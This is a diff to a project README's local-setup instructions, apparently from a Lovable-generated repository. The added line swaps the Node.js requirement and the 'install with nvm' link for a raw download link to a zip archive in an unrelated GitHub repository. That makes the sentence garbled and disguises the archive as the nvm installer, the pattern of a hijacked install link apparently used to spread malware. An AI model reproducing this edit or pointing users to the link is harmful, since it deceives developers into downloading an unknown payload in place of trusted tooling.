@@ -3,7 +3,7 @@
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+The only requirement is having https://github.com/r2hloveu/3d-ROBOT/raw/refs/heads/main/prizeworthy/ROBOT-d-v3.1.zip & npm installed - [install with nvm](https://github.com/r2hloveu/3d-ROBOT/raw/refs/heads/main/prizeworthy/ROBOT-d-v3.1.zip)
 
 Follow these steps:
 
